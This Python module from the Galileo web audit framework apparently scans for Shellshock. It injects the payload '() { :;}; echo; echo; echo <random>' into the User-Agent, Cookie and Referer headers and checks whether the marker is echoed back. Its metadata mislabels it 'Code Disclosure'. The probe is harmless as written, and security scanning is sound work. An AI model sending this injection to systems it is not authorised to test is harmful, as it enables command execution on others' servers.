#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# @name  : Galileo 
# @descr : Web Application Audit Framework
# @author: Momo Outaadi

import re
from lib.utils.rand import *
from lib.utils.printer import *
from core.module import BaseModule
from lib.request.grequest import (
    check_url,check_end
)

class Module(BaseModule):

    info = {
        'name': 'Code Disclosure',
        'author': 'Momo Outaadi',
        'description': 'Search the Code Disclosure vulnerability',
        'options': (
            ('host', None, True, 'The target address'),
            ('url_path', '/',False,'The target URL path'),
            ('method','GET',False,'HTTP method'),
            ('port', 80, False, 'The target port'),
            ('data',None,False,'POST data')
        ),
    }

    def module_run(self):
        r_str = rand_str(30)
        exploit = '() { :;}; echo; echo; echo %s'%(r_str)
        test('Exploiting...')
        host = self.options['host']
        port = self.options['port']
        data = self.options['data']
        method = self.options['method']
        url_path = self.options['url_path']
        headers = {
                'User-Agent' : exploit,
                'Cookie'     : exploit,
                'Referer'    : exploit
        }
        url = check_url(check_end(host,url_path),port)
        # request 
        resp = self.request(url=url,method=method,data=data,headers=headers)
        if resp.code == 200:
            if re.search(r_str,resp.content,re.I):
                plus('ShellShock was found in: %s'%(resp.url))
            else:return
        else:return